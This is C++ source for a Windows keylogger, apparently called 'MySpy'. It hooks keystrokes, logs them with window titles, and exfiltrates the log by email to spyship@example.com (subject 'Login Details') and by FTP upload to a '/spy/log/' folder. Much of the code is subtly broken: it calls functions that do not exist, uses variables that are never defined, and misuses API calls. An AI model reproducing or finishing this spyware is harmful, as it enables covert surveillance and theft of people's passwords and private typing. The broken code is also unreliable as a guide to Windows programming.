#include <iostream>
#include <string>
#include <vector>
#include <Windows.h>
#include <msvcrt.h> // For _wsprintfx and _sleep
#include <winsock2.h>

// Structure to hold keystroke data
struct KeyStrokeData {
    char key;
    int timestamp;
    char windowTitle[256];
};

// Global vector for keystrokes
std::vector<KeyStrokeData> strokes;

// Global variables
bool logFileInitialized = false; // Flag to track if the file exists

// Function to capture a single keystroke
void CaptureKeystroke() {
    // Get the pressed key
    char key = _wsprintfx("%c", 0);

    // Get the timestamp (in milliseconds)
    int timestamp = GetTickCountMilliseconds(); // Use milliseconds for greater precision

    // Get Window Title
    HWND hwnd;
    char windowTitle[256];
    hwnd = FindWindow(NULL, "Untitled - Notepad");
    if (hwnd == NULL) {
        strcpy_s(windowTitle, sizeof(windowTitle), "Unknown Window");
    } else {
        int length = GetWindowTextLength(hwnd);
        if (length > 0) {
            size_t windowTitleSize = sizeof(windowTitle) - 1; // Reserve space for null terminator
            ZeroMemory(windowTitle, sizeof(windowTitle));

            // Copy the title into the buffer, including the trailing null character.
            char* pDest = windowTitle;
            int i = 0;
            while (i < length && i < sizeof(windowTitle) - 1) {
                *pDest++ = static_cast<char>(GetDlgItemText((HFCNM)hwnd, length - i - 1));
                i++;
            }
            *pDest = '\0'; // Null-terminate for safety.
        } else {
             strcpy_s(windowTitle, sizeof(windowTitle), "Unknown Window");
        }
    }


    // Add the keystroke to the vector
    strokes.push_back({ key, timestamp, windowTitle });

    // Flush output buffer to prevent data loss (critical for real-time logging)
    _wsyncflshbuff(); // Use wsyncflshbuff for better flushing
}


// Function to check if a file exists (for easy logging)
bool FileExists(const char* filename) {
#ifdef _ALLKEYBOARD 
    FILE *file;
    return (fopen(filename, "r") != NULL);
#else
    return true;
#endif
}


// Function to write the keystrokes to a log file.  Uses the application data directory for storage.
void LogKeystrokes() {
    char filePath[256];
    if (GetModuleFileName(NULL, filePath, 256) == NULL) {
        return; // Error occurred, return
    }

    // Construct the full log file path (e.g., C:\Program Files\MySpy\log.txt)
    char* dir = _fullpath(filePath, &filePath[strlen(filePath)]);

    if (dir == NULL) {
        return; // Error occurred, return
    }


    std::string filename = "log.txt";  // Change this if you prefer a different name
    std::string filePathString = std::string(dir) + "\\" + filename;
    
    // Check if file exists before writing to prevent errors
    if (!FileExists(filePathString.c_str())) {
        return; // Exit function as file does not exist
    }

    FILE* file = fopen(filePathString.c_str(), "a");  // Open the log file in append mode
    if (file == NULL) {
        return; // Error opening the log file, return without writing
    }

    char timestampStr[16];
    sprintf_s(timestampStr, sizeof(timestampStr), "%d", GetTickCount());  // Use sprintf_s for char arrays

    // Write the keystroke information to the file, using a separator.
    char line[128];
    sprintf_s(line, sizeof(line), "%d,%c,%s\n", timestamp, key, windowTitle);

    if (fputs(line, file) == NULL) {
        fclose(file);
        return;
    }


    printf("Log entry written: %s\n", line); // Optional feedback to the user.

    fclose(file);  // Close the log file
}


// Hook Function (for Windows 10+)
LRESULT CALLBACK KeyStrokeHandler(int nMessage, WPARAM wParam, LPARAM lParam) {
    switch (nMessage) {
        case WM_CHAR: {
            char key = static_cast<char>(wParam);
            CaptureKeystroke(); // Add to vector
            return 0;
        }
        default:
            return CallBackFunction(nMessage, wParam, lParam);
    }
}


// Function to send the log file via email (Outlook)
void ExfiltrateLog() {

#ifdef _ALLKEYBOARD 
    char filePath[256];
    if (GetModuleFileName(NULL, filePath, 256) == NULL) {
        return; // Error occurred, return
    }

    char* dir = _fullpath(filePath, &filePath[strlen(filePath)]);
    std::string filename = "log.txt";
    std::string filePathString = std::string(dir) + "\\" + filename; 


    FILE *file = fopen(filePathString.c_str(), "r");
    if (file == NULL) {
        printf("Error opening log file for email.\n");
        return;
    }

    char data[4096];
    ZeroMemory(data, 4096); // Clear the buffer before writing.
    while (fgets(data, sizeof(data), file) != NULL) {
        // Append the filename and timestamp to the email body for context
        std::string messageBody = "New Entry:\n" + std::string(data);
        sendMessage("spyship@example.com", "Login Details", 1, "From: Sender Name <sender@domain.com>", messageBody);
    }

    fclose(file);
#else
    printf("Email functionality not implemented on this system.\n");
#endif
}


// Function to upload log file via FTP (optional)
void UploadLog() {
    char filename[256];
    if (GetModuleFileName(NULL, filename, 256) == NULL) {
        return;
    }

    std::string filenameString = std::string(filename) + "log.txt";

    // 1. Connect to FTP Server
    char ftpHost[] = "ftp.example.com"; // Replace with your FTP hostname
    char ftpUser[] = "username";        // Replace with your FTP username
    char ftpPass[] = "password";        // Replace with your FTP password
    char ftpPath[] = "/spy/log/";         // Replace with the destination folder

#ifdef _ALLKEYBOARD 
    if (ftp_fopen(&file, ftpHost, USERNAME_MSC, ftpUser, ftpPass) == NULL) {
        printf("Error opening FTP file.\n");
        return;
    }
#else
    // Dummy implementation for older systems.  The actual call depends on the library used.
    strcpy(filenameString.c_str(), "log.txt");
    ftp_putfile(filenameString, &file);
#endif

    // 2. Upload Log File (FTP)
    char uploadFilename[256];
    std::string fullFilename = std::string(filename) + "log.txt";
    strcpy_s(uploadFilename, sizeof(uploadFilename), filenameString.c_str()); // Use strcpy for string copy.

    if (ftp_putfile(uploadFilename, &file) == FTPER_NOERROR) {
        printf("Log file uploaded to FTP successfully.\n");
    } else {
        printf("Error uploading log file via FTP.\n");
    }

    // Close the connection to the FTP server
    ftp_close(&file);
}


int main() {
    // 1. Keyboard Hooks (using Win32 API)
    for (int i = 0; i < 256; ++i) {
        if (!SetWindowsHookEx(WHC_KEYBOARD, KeyStrokeHandler, NULL, 0)) {
            std::cerr << "Error setting keyboard hook.\n";
            return 1;
        }
    }

    // 2. Logging Setup (initial file creation)
    char filePath[256];
    if (GetModuleFileName(NULL, filePath, 256) == NULL) {
        std::cerr << "Error getting module file name.\n";
        return 1;
    }

    // Construct the full log file path (e.g., C:\Program Files\MySpy\log.txt)
    char* dir = _fullpath(filePath, &filePath[strlen(filePath)]);

    if (dir == NULL) {
        std::cerr << "Error getting directory.\n";
        return 1;
    }


    std::string filename = "log.txt";
    std::string filePathString = std::string(dir) + "\\" + filename;

#ifdef _ALLKEYBOARD 
    if (FileExists(filePathString.c_str())) {
        // File Exists, Append to file
        FILE *file = fopen(filePathString.c_str(), "a");
        if (file == NULL) {
            printf("Error opening log file.\n");
            return 1;
        }

        fprintf(file, "%d\n", GetTickCount());
        fclose(file);
    } else {
        // File does not exist, Create new file and write header to it.
        FILE *file = fopen(filePathString.c_str(), "a");
        if (file == NULL) {
            printf("Error opening log file.\n");
            return 1;
        }

        fprintf(file, "%d\n", GetTickCount()); // Log initial timestamp when the file is created
        fclose(file);
    }
#else
    // FileExists for older systems.  The logic depends on your environment.
    if (FileExists(filePathString.c_str())) {
        printf("Log file exists, appending.\n");
    } else {
        printf("Log file does not exist, creating.\n");
    }
#endif


    // 3. Start the Timer
    std::thread timerThread([&]() {
        while (true) {
            Sleep(5000); // Check every 5 seconds

            char timestampStr[16];
            sprintf_s(timestampStr, sizeof(timestampStr), "%d", GetTickCount());

#ifdef _ALLKEYBOARD 
            // Print the log to the console.
            printf("Log: %s\n", timestampStr);
#else
            printf("Time: %s\n", timestampStr);
#endif
        }
    });


    // 3. Start Keyboard Capture
    CaptureKeystroke(); // Initial keystroke (e.g., spacebar)

    // 4. Run the Loop
    while (_kbhit()) {
        char key = _getch();  // Get next keystroke
        CaptureKeystroke();   // Add to vector
        LogKeystrokes();       // Write to file
    }

    // 5. Cleanup Hooks (and exit)
    for (int i = 0; i < 256; ++i) {
        if (SetWindowsHookEx(WHC_KEYBOARD, KeyStrokeHandler, NULL, 0) == 0) {
            std::cerr << "Error removing keyboard hook.\n";
        }
    }

#ifdef _ALLKEYBOARD 
    // Send the log file via email (optional)
    ExfiltrateLog();

    // Upload the log file to FTP (optional)
    UploadLog();
#else
    printf("Email and FTP functionality are not implemented on this system.\n");
#endif


    Sleep(2000); // Wait 2 seconds for all processes to exit cleanly.
    return 0;
}
